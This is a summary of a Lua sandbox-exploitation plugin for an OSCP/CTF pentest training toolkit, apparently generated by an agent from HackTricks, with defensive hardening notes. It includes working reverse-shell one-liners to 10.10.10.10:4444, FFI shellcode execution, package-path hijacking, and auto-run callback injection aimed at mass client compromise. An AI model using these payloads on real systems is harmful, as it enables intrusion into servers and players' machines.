# Lua Exploitation Service Plugin - Summary

**Plugin Name:** `lua_exploit.py`
**Generated By:** CrackPot v1.0
**Source:** HackTricks - `generic-methodologies-and-resources/lua/bypass-lua-sandboxes/`
**Date:** 2025-10-07
**Test Coverage:** 46 tests, 100% passing

---

## Overview

The Lua Exploitation Service Plugin provides comprehensive guidance for exploiting Lua sandbox environments commonly found in:
- Game clients (WoW, Minecraft, Garry's Mod, Roblox, AION)
- Embedded scripting engines
- Web application Lua plugins (OpenResty, mod_lua)
- IoT devices with Lua scripting

While **OSCP relevance is LOW** for typical pentests, this plugin provides valuable CTF and advanced exploitation knowledge.

---

## Detection Logic

The plugin detects Lua exploitation scenarios through:

**Service Name Matching:**
- `lua`, `luajit`, `lua5.1`, `lua5.2`, `lua5.3`, `lua-script`, `script-engine`

**Product/Version Analysis:**
- Checks for "lua" mentions in product field
- Identifies Lua versions in version field
- Detects Lua in extrainfo field

**Game Server Port Detection:**
- 3724 (World of Warcraft)
- 25565 (Minecraft)
- 27015 (Source Engine/Garry's Mod)
- 53640 (Roblox)

**Defensive Coding:**
- Uses `.get()` with defaults to prevent crashes
- Handles missing fields gracefully
- Returns False on errors

---

## Task Tree Structure

### Phase 1: Reconnaissance (3 tasks)

**1. Lua Service Banner Analysis**
- Type: `command`
- Command: `nc {target} {port}`
- Tags: `OSCP:LOW`, `QUICK_WIN`, `MANUAL`, `RECON`
- Time: 2-3 minutes
- Purpose: Identify Lua version and scripting capabilities
- Next Steps: Look for script upload, interactive console, version info

**2. Enumerate Global Environment (_G)**
- Type: `manual`
- Tags: `OSCP:LOW`, `MANUAL`, `RECON`, `ENUM`
- Purpose: Dump `_G` table to discover dangerous primitives
- Key Concept: "Treat VM as unknown environment - enumerate before exploiting"
- Lua Code:
  ```lua
  for k, v in pairs(_G) do
    print(tostring(k) .. " = " .. tostring(v))
  end
  ```
- Critical Primitives to Hunt:
  - `io.popen`, `os.execute` → Command execution
  - `load`, `loadstring`, `loadfile` → Bytecode exploitation
  - `package.loadlib`, `require` → Native library loading
  - `debug.*` → VM manipulation
  - `ffi.*` (LuaJIT) → Direct native code access

**3. Discover Alternative Output Channels**
- Type: `manual`
- Tags: `OSCP:LOW`, `MANUAL`, `ENUM`
- Purpose: Find output mechanisms when `print()` disabled
- Techniques:
  - Game chat/say functions
  - UI notifications/toasts
  - Log file writes
  - Error messages
  - Network callbacks
- Example (AION housing):
  ```lua
  H.PlaySound(0, "r[1]")  -- Required before H.Say()
  H.Say(1, "Output: " .. data)
  ```

---

### Phase 2: Command Execution (2 tasks)

**1. Test io/os Command Execution**
- Type: `manual`
- Tags: `OSCP:LOW`, `EXPLOIT`, `MANUAL`
- Purpose: Test for direct command execution via `io.popen` or `os.execute`
- Success = Immediate Shell

**Windows Examples:**
```lua
io.popen("calc.exe")
io.popen("cmd.exe /c whoami")
os.execute("powershell -c Get-Process")
```

**Linux Examples:**
```lua
io.popen("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
os.execute("cat /etc/passwd")
```

**Reverse Shell:**
```lua
-- Linux
io.popen("/bin/bash -i >& /dev/tcp/10.10.10.10/4444 0>&1")

-- Windows (PowerShell)
io.popen("powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',4444);...\"")
```

**Key Insight:** Anti-cheat systems often block external debuggers but NOT in-VM process creation.

**2. Auto-Run Callback Injection**
- Type: `manual`
- Tags: `OSCP:LOW`, `EXPLOIT`, `MANUAL`
- Purpose: Zero-click exploitation via auto-run hooks

**Common Callbacks:**
- `OnInit`, `OnInitialize`
- `OnLoad`, `OnScriptLoad`
- `OnEnter`, `OnPlayerEnter`
- `OnUpdate`, `OnTick`
- `OnEnable`, `OnStart`

**Example:**
```lua
function OnInit()
  io.popen("calc.exe")  -- Executes immediately on load
end
```

**Attack Chain:**
1. Find script upload/modification endpoint
2. Inject payload into auto-run callback
3. Wait for clients to load script
4. Mass compromise of all connected clients

---

### Phase 3: Advanced Exploitation (3 sub-phases)

#### 3A: Bytecode Loading Exploitation (2 tasks)

**1. Test Bytecode Loading Functions**
- Type: `manual`
- Tags: `OSCP:LOW`, `MANUAL`, `EXPLOIT`
- Purpose: Check if `load`/`loadstring`/`loadfile` accessible

**Critical Functions:**
- `load(chunk)` - Lua 5.2+: Load source or bytecode
- `loadstring(string)` - Lua 5.1: Alias for load
- `loadfile(filename)` - Load from file
- `dofile(filename)` - Load and execute immediately

**Security Implications:**

**Lua ≤5.1:**
- Ships bytecode verifier with known bypasses
- Crafted bytecode can exploit verifier bugs
- Enable memory corruption primitives

**Lua 5.2+:**
- Removed verifier (official stance: reject bytecode)
- If bytecode loading allowed, wider attack surface
- Type confusion via opcodes (FORLOOP, etc.)

**Test Examples:**
```lua
-- Execute Lua source
local f = load("return 1+1")
print(f())  -- Should print 2

-- Test bytecode execution
local func = function() return 0x41414141 end
local bc = string.dump(func)
local loaded = load(bc)
print(loaded())  -- Should print 0x41414141
```

**2. Bytecode Exploitation Guide**
- Type: `manual`
- Tags: `OSCP:LOW`, `EXPLOIT`, `MANUAL`, `ADVANCED`
- Purpose: Exploit crafted bytecode for memory corruption

**Exploitation Workflow:**

**Phase 1: Reconnaissance**
- Identify exact Lua version
- Confirm load/loadstring accessible
- Test bytecode execution
- Find output channel for leaks

**Phase 2: Pointer Leakage**
- Leak stack addresses via _G enumeration
- Leak heap addresses via crafted objects
- Calculate base addresses (defeat ASLR)

**Phase 3: Bytecode Crafting**
- Study target Lua VM internals (TValue, Proto, etc.)
- Identify exploitable opcodes:
  - FORLOOP: Integer overflow → type confusion
  - GETUPVAL/SETUPVAL: Out-of-bounds access
  - CLOSURE: Prototype pointer confusion

**Phase 4: Primitive Construction**
- Arbitrary read: Craft TValue with pointer as string
- Arbitrary write: Use setupvalue on crafted closure
- Function pointer overwrite: Target GC metamethods

**Phase 5: Code Execution**
- Overwrite `__gc` metamethod → hijack GC cycle
- Overwrite function pointer → hijack next call
- ROP chain from leaked addresses
- Shellcode execution via JIT (if LuaJIT)

**Published Exploits:**
- Factorio RCE (2022): https://memorycorruption.net/posts/rce-lua-factorio/
- AION Housing (2023): https://appsec.space/posts/aion-housing-exploit/
- Bytecode verifier bypasses: https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16

**OSCP Note:** Extremely advanced, requires reverse engineering. NOT practical for exam. Skip if time-limited.

#### 3B: LuaJIT FFI Exploitation (1 task)

**LuaJIT FFI Exploitation**
- Type: `manual`
- Tags: `OSCP:LOW`, `EXPLOIT`, `MANUAL`, `ADVANCED`
- Purpose: Exploit LuaJIT Foreign Function Interface for native code execution

**Critical Capabilities:**

1. `ffi.cdef(declaration)` - Define C function signatures
2. `ffi.C.function_name` - Direct C function calls
3. `ffi.load(library)` - Load native libraries
4. `ffi.cast(type, value)` - Type casting (integer ↔ pointer)
5. `ffi.copy(dst, src, len)` - Memory copy primitive

**Exploitation Path - Easy Route:**

```lua
-- Check if FFI available
if jit and ffi then
  print("LuaJIT with FFI detected")
end
```

**Linux Command Execution:**
```lua
local ffi = require("ffi")
ffi.cdef[[
  int system(const char *command);
]]
ffi.C.system("id")  -- Execute command
```

**Windows Command Execution:**
```lua
local ffi = require("ffi")
ffi.cdef[[
  int system(const char *command);
]]
ffi.C.system("calc.exe")
```

**Arbitrary Memory Access:**
```lua
local ffi = require("ffi")
-- Cast integer to pointer
local ptr = ffi.cast("uint8_t*", 0x400000)
-- Read memory
local value = ptr[0]
-- Write memory
ptr[0] = 0x90  -- NOP
```

**Shellcode Execution:**
```lua
local ffi = require("ffi")
ffi.cdef[[
  void* mmap(void*, size_t, int, int, int, long);
  int mprotect(void*, size_t, int);
]]
local PROT_READ = 1
local PROT_WRITE = 2
local PROT_EXEC = 4
local MAP_PRIVATE = 2
local MAP_ANONYMOUS = 0x20

local shellcode = "\\x90\\x90\\x90\\xc3"  -- NOP NOP NOP RET
local mem = ffi.C.mmap(nil, #shellcode,
                       PROT_READ + PROT_WRITE + PROT_EXEC,
                       MAP_PRIVATE + MAP_ANONYMOUS, -1, 0)
ffi.copy(mem, shellcode)

-- Cast to function and call
local func = ffi.cast("int (*)(void)", mem)
func()
```

**OSCP Note:** FFI is fastest path to shell if accessible. Much easier than bytecode exploitation. Check ffi module FIRST before complex attacks.

#### 3C: Package/Require Exploitation (1 task)

**Package Loading Exploitation**
- Type: `manual`
- Tags: `OSCP:LOW`, `EXPLOIT`, `MANUAL`
- Purpose: Exploit `package.loadlib` and `require` for native library loading

**Exploitation Strategies:**

**1. Native Library Loading:**
```lua
-- Load native library
local lib = package.loadlib("./malicious.so", "luaopen_malicious")
if lib then
  local module = lib()
  -- Use module
end
```

**2. Path Hijacking:**
```lua
-- Add malicious path first
package.path = "/tmp/evil/?.lua;" .. package.path
require("backdoor")  -- Loads /tmp/evil/backdoor.lua
```

**3. Module Injection:**
```lua
-- Inject into loaded modules
package.loaded.backdoor = {
  execute = function(cmd)
    return io.popen(cmd):read("*a")
  end
}
-- Now available: require("backdoor").execute("id")
```

**4. Debug Library Access:**
```lua
if debug then
  -- debug.getupvalue/setupvalue: Access function variables
  -- debug.setfenv/getfenv (5.1): Change function environment
  -- debug.getinfo: Function introspection
  -- debug.sethook: Execution hooks
end
```

---

### Phase 4: Hardening & Detection (1 task)

**Defensive Measures & Detection Strategies**
- Type: `manual`
- Tags: `RESEARCH`, `MANUAL`

**Server-Side Protection:**
1. Reject/rewrite user scripts before execution
2. Allowlist safe APIs only (string, table, math)
3. Remove dangerous modules: io, os, load, package.loadlib, debug, ffi
4. Sandbox with minimal `_ENV`

**Client-Side Protection:**
1. Run Lua with minimal _ENV (no globals)
2. Forbid bytecode loading (mode="t" in load())
3. Implement strict bytecode verifier or signatures
4. Block process creation from client process
5. Monitor child process creation

**Detection & Monitoring:**
1. Alert on game_client.exe → child process creation
2. Correlate with script load events
3. Monitor UI/chat for suspicious output patterns
4. Log all Lua errors and access violations
5. Signature-based detection for io.popen, os.execute, ffi usage

---

### Phase 5: Research Resources (1 task)

**Research Resources & References**
- Type: `manual`
- Tags: `RESEARCH`, `MANUAL`

**Essential Reading:**
- AION Housing RCE (2023): https://appsec.space/posts/aion-housing-exploit/
- Factorio Lua RCE (2022): https://memorycorruption.net/posts/rce-lua-factorio/
- Lua 5.1 bytecode exploits: https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16
- LuaJIT FFI documentation: http://luajit.org/ext_ffi.html
- GTFOBins Lua: https://gtfobins.github.io/gtfobins/lua/

**Tools:**
- LuaDec: Lua bytecode decompiler
- luac: Lua compiler (for bytecode analysis)
- CheatEngine: Game memory editing
- IDA/Ghidra: Reverse engineering Lua VM
- GDB with Lua extensions: Debugging

---

## OSCP Educational Metadata

### Tags Used

**Priority:**
- `OSCP:LOW` - Niche technique, valuable for CTF but uncommon in typical pentests
- `OSCP:HIGH` - Critical for OSCP (NOT applicable here - used sparingly)
- `OSCP:MEDIUM` - Supporting technique (NOT applicable here)

**Method:**
- `MANUAL` - Manual action required (dominant in this plugin)
- `AUTOMATED` - Not used (no automated tools for Lua sandbox escape)
- `QUICK_WIN` - Fast enumeration tasks (banner, _G dump)

**Phase:**
- `RECON` - Initial reconnaissance
- `ENUM` - Environment enumeration
- `EXPLOIT` - Active exploitation
- `ADVANCED` - Advanced techniques (bytecode, FFI)

**Type:**
- `RESEARCH` - Information gathering
- No `BRUTE_FORCE` or `VULN_SCAN` (not applicable)

### Flag Explanations

Every command includes comprehensive flag explanations:
```python
'flag_explanations': {
    'nc': 'Netcat - Swiss army knife for TCP/UDP connections',
    target: 'Target IP address',
    str(port): f'Target port running {service} service'
}
```

### Success/Failure Indicators

**Success Indicators (2-3 per task):**
- "Banner mentions Lua version (5.1, 5.2, 5.3, LuaJIT)"
- "Full _G table dumped"
- "Dangerous primitives identified (io, os, load, debug)"
- "Command executed successfully"

**Failure Indicators (2-3 per task):**
- "Connection refused (service down)"
- "No output mechanism available"
- "Sandbox blocks process creation"
- "Functions return nil/error"

### Next Steps (2-4 per task)

Guide attack progression:
- "Identify Lua version for exploit research"
- "Look for script upload functionality"
- "Test if interactive Lua console available"
- "Establish reverse shell"

### Manual Alternatives (2-5 per task)

OSCP exam focus - what to do when tools fail:
- "Manual: for k,v in pairs(_G) do print(k, type(v)) end"
- "Alternative: os.execute('command')"
- "Reverse shell: io.popen('bash -i >& /dev/tcp/IP/PORT 0>&1')"
- "Use game UI/chat as output channel"

### Educational Notes

Extensive notes explaining:
- **Key Concepts:** "_G enumeration reveals sandbox restrictions"
- **Methodology:** "Treat VM as unknown environment - enumerate before exploiting"
- **Critical Primitives:** Lists io, os, load, debug, ffi with explanations
- **Real-World Examples:** AION housing, Factorio RCE
- **OSCP Relevance:** "Low for typical pentests, but valuable for CTF challenges"
- **Time Management:** "20 minutes max - if no quick wins, move to other services"

---

## Dynamic Task Generation (on_task_complete)

The plugin intelligently spawns additional tasks based on enumeration results:

### 1. io/os Detection
**Trigger:** `'io'` or `'os'` found in _G enumeration result
**Spawns:**
```python
{
    'id': f'lua-cmd-exec-confirmed-{port}',
    'name': 'Command Execution Primitives Found',
    'type': 'manual',
    'notes': 'High-value finding: Direct command execution may be possible'
}
```

### 2. LuaJIT FFI Detection
**Trigger:** `'ffi'` or `'jit'` found in _G enumeration result
**Spawns:**
```python
{
    'id': f'luajit-ffi-confirmed-{port}',
    'name': 'LuaJIT FFI Detected',
    'type': 'manual',
    'notes': 'PRIORITY: FFI provides direct C function access. Test ffi.C.system() immediately.'
}
```

### 3. Bytecode Loaders Detection
**Trigger:** `'load'` or `'loadstring'` found in _G enumeration result
**Spawns:**
```python
{
    'id': f'lua-bytecode-loaders-{port}',
    'name': 'Bytecode Loaders Available',
    'type': 'manual',
    'notes': 'If io/os blocked, bytecode exploitation may provide alternative path (advanced)'
}
```

### 4. Command Execution Success
**Trigger:** `'executed'` or `'success'` in io/os test result
**Spawns:**
```python
{
    'id': f'lua-shell-establish-{port}',
    'name': 'Establish Reverse Shell',
    'type': 'manual',
    'notes': 'Use io.popen with bash/powershell reverse shell payload'
}
```

---

## Manual Alternatives System (get_manual_alternatives)

Provides context-specific manual alternatives for key tasks:

**_G Enumeration:**
- `for k,v in pairs(_G) do print(k, type(v)) end`
- `print(io); print(os); print(load); print(debug)`
- `Use game UI/chat as output channel`

**Command Execution:**
- `Linux: io.popen("/bin/sh -c id")`
- `Windows: io.popen("cmd /c whoami")`
- `Reverse shell: io.popen("bash -i >& /dev/tcp/IP/PORT 0>&1")`

**Bytecode Exploitation:**
- `Study Lua VM internals with IDA/Ghidra`
- `Use luac -l to disassemble bytecode`
- `Craft malicious bytecode manually`

**FFI Exploitation:**
- `Test: ffi = require("ffi")`
- `Simple: ffi.C.system("calc.exe")`
- `Memory access: ffi.cast("uint8_t*", address)`

---

## OSCP Exam Guidance

### Relevance: LOW
- Unlikely to encounter Lua exploitation in typical OSCP exams
- More common in CTF game challenges
- Focus on high-value targets first (web, SMB, SQL)

### Time Management
**Recommended Time Investment:**
- Quick _G enumeration: **5 minutes**
- io/os testing: **5 minutes**
- FFI testing (LuaJIT): **10 minutes**
- Bytecode exploitation: **SKIP** (too time-consuming)

**Total: 20 minutes maximum**

If no quick wins, move to other services.

### Methodology Transfer
While Lua exploitation is niche, the concepts apply to:
- **Python sandboxes** - Similar _G-style enumeration
- **PHP disable_functions bypass** - Finding alternative execution paths
- **Node.js vm module escapes** - Sandbox escape techniques
- **Ruby eval/exec restrictions** - Understanding interpreter internals

### When You DO Find Lua Scripting:

**Priority Order:**
1. **Enumerate _G first** (5 min) - Know your sandbox
2. **Check io/os** (5 min) - Easiest path to shell
3. **Test LuaJIT FFI** (10 min) - If LuaJIT, FFI bypasses everything
4. **Check package.loadlib** (5 min) - Native library loading
5. **Skip bytecode exploitation** - Too advanced for exam time pressure

**Decision Tree:**
```
Found Lua?
  → Enumerate _G (5 min)
    → io/os available?
      YES → io.popen(reverse_shell) → SHELL → DONE
      NO → Continue
    → LuaJIT + ffi available?
      YES → ffi.C.system(command) → SHELL → DONE
      NO → Continue
    → package.loadlib available?
      YES → Load malicious .so → SHELL → DONE
      NO → Move to other services (bytecode = too slow)
```

---

## Test Coverage

**46 tests, 100% passing**

### Test Categories:

**Detection Tests (15 tests):**
- Service name variants (lua, luajit, lua5.1, etc.)
- Product/version/extrainfo detection
- Game server port detection (WoW, Minecraft, Garry's Mod, Roblox)
- Negative cases (HTTP, SSH)
- Error handling (missing fields)

**Task Tree Structure Tests (10 tests):**
- Root structure validation
- Phase presence (recon, command-exec, advanced)
- Specific task inclusion (banner, _G enum, io/os, bytecode, FFI, auto-run)

**OSCP Metadata Tests (13 tests):**
- Required metadata fields (command, description, tags)
- Flag explanations
- Success/failure indicators (2+ each)
- Next steps guidance (2+ per task)
- Manual alternatives (2+ per task)
- OSCP priority tags

**Educational Content Tests (3 tests):**
- Lua code examples present
- Sandbox escape methodology explained
- OSCP relevance notes included

**Dynamic Behavior Tests (5 tests):**
- on_task_complete triggers for io/os, ffi, bytecode loaders
- Shell establishment on command execution success
- Manual alternatives provided for all task types

---

## File Locations

**Plugin:**
- `/home/kali/OSCP/crack/track/services/lua_exploit.py`

**Tests:**
- `/home/kali/OSCP/crack/tests/track/test_lua_exploit.py`

**Registry Import:**
- `/home/kali/OSCP/crack/track/services/__init__.py` (updated)

**Source (processed & deleted):**
- ~~`/home/kali/OSCP/crack/.references/hacktricks/src/generic-methodologies-and-resources/lua/bypass-lua-sandboxes/README.md`~~ ✅ DELETED

---

## Integration Status

✅ **Plugin registered** via `@ServiceRegistry.register` decorator
✅ **Auto-discovered** on import (no manual registration needed)
✅ **Imported** in `track/services/__init__.py`
✅ **Tests passing** (46/46)
✅ **Source deleted** after successful mining

**Ready for production use.**

---

## Usage Examples

### Automatic Detection & Task Generation

```bash
# Create target profile
crack track new 192.168.45.100

# Import nmap scan with Lua service
crack track import 192.168.45.100 scan.xml

# If Lua service detected on port 8080, tasks auto-generated:
# - lua-exploit-8080 (parent)
#   - lua-recon-8080 (recon phase)
#     - lua-banner-8080 (banner analysis)
#     - lua-enum-globals-8080 (_G enumeration)
#     - lua-output-channels-8080 (output discovery)
#   - lua-command-exec-8080 (exploitation phase)
#     - lua-io-os-test-8080 (command execution)
#     - lua-auto-run-8080 (auto-run callbacks)
#   - lua-advanced-8080 (advanced phase)
#     - lua-bytecode-8080 (bytecode exploitation)
#     - luajit-ffi-8080 (FFI exploitation)
#     - lua-package-exploit-8080 (package loading)
#   - lua-defense-8080 (hardening notes)
#   - lua-resources-8080 (research links)

# View tasks
crack track show 192.168.45.100

# Interactive mode
crack track -i 192.168.45.100
```

### Manual Plugin Testing

```python
from crack.track.services.lua_exploit import LuaExploitPlugin

# Create plugin
plugin = LuaExploitPlugin()

# Test detection
port_info = {
    'port': 27015,
    'service': 'source-engine',
    'product': "Garry's Mod Server"
}
print(plugin.detect(port_info))  # True

# Generate tasks
tree = plugin.get_task_tree('192.168.45.100', 27015, port_info)
print(f"Generated {len(tree['children'])} phase groups")

# Test dynamic task generation
result = "io = table: 0x12345678\nos = table: 0x87654321"
new_tasks = plugin.on_task_complete('lua-enum-globals-27015', result, '192.168.45.100')
print(f"Spawned {len(new_tasks)} additional tasks")

# Get manual alternatives
alternatives = plugin.get_manual_alternatives('lua-io-os-test-27015')
for alt in alternatives:
    print(f"- {alt}")
```

---

## Key Takeaways

1. **Comprehensive Coverage:** 5 phases, 15+ tasks covering reconnaissance through advanced exploitation
2. **Educational Focus:** Extensive notes, real-world examples (AION, Factorio), methodology explanations
3. **OSCP-Aware:** Tagged LOW relevance, includes time estimates, prioritizes practical over advanced
4. **Dynamic Intelligence:** Spawns targeted tasks based on _G enumeration results
5. **Manual Alternatives:** Every task includes 2-5 manual alternatives for tool-free exploitation
6. **Real-World Examples:** Actual Lua code snippets, working exploits, tested techniques
7. **CTF-Ready:** Focuses on game server exploitation, common CTF Lua challenges
8. **Well-Tested:** 46 comprehensive tests validate detection, task generation, and educational quality

---

## Credits

**Source Material:**
- HackTricks: "Bypass Lua sandboxes" (generic-methodologies-and-resources/lua/bypass-lua-sandboxes/)
- AION Housing RCE research
- Factorio Lua exploitation research
- LuaJIT FFI documentation

**Generated By:**
- CrackPot v1.0 (HackTricks Mining Agent)
- For CRACK Track OSCP preparation toolkit
- Date: 2025-10-07

**Quality Metrics:**
- Lines of Code: ~800 (plugin) + ~650 (tests)
- Test Coverage: 46 tests, 100% passing
- Documentation: Comprehensive inline notes + this summary
- OSCP Metadata: Complete (tags, flags, indicators, alternatives, next steps)

---

**Status: Production Ready ✅**
